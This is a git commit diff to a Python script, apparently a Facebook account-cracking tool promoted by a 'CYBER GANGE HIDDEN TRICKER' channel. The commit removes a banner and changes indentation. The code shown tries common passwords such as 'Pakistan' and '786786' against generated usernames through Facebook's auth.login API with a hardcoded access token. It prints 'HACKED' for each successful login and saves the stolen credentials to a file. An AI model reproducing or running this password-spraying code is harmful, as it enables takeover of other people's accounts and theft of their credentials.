d26db70313392f3d4187b4520157490b1cecc171
GangeLeader <79110035+GangeLeader@users.noreply.github.com>
2021-03-09 17:57:02 +0500

    Update sp.py

--- sp.py
+++ sp.py
@@ -69,12 +69,7 @@ c3 = "\033[1;31m"
 ##### LOGO #####
 logo='''
 print
-░█████╗░██████╗░██████╗░░█████╗░██████╗░
-██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
-███████║██████╔╝██████╦╝███████║██████╦╝
-██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
-██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
-╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
+
 \x1b[1;93m--------------------------------------------------------------
 \x1b[1;92m➣  YouTube  : CYBER GANGE HIDDEN TRICKER
 \x1b[1;91m➣  Facebook : ARBAB ALI MEMON
@@ -252,9 +247,9 @@ def action():
 				else:	
 					pass2 = 'Pakistan'
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			    q = json.load(data)
+			                q = json.load(data)
 					if 'access_token' in q:
-		        print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
+		                                print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
@@ -269,7 +264,7 @@ def action():
 						else:	
 							pass3 = '786786'
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			        q = json.load(data)
+			                                q = json.load(data)
 							if 'access_token' in q:
 								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 								okb = open('save/successfull.txt', 'a')
